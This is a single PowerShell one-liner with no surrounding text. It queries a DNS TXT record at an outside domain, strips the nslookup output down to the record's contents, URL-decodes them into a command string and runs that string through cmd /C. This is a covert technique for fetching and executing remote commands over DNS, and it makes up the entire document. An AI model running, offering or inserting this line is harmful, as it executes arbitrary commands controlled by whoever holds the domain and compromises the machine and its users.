nslookup -q=txt shtxt.gam.click | Select-String -Pattern 'Server' -NotMatch | Select-String -Pattern 'Address' -NotMatch | Select-String -Pattern 'DNS' -NotMatch | Select-String -Pattern 'timeout' -NotMatch | Select-String -Pattern 'UnKnown' -NotMatch | Select-String -Pattern 'txt.gam.click' -NotMatch | foreach-object -Process {$newans += ($_).tostring().Trim().Trim('\"').Trim('\n')} ; $command = [uri]::UnescapeDataString($newans) ; cmd /C "$command"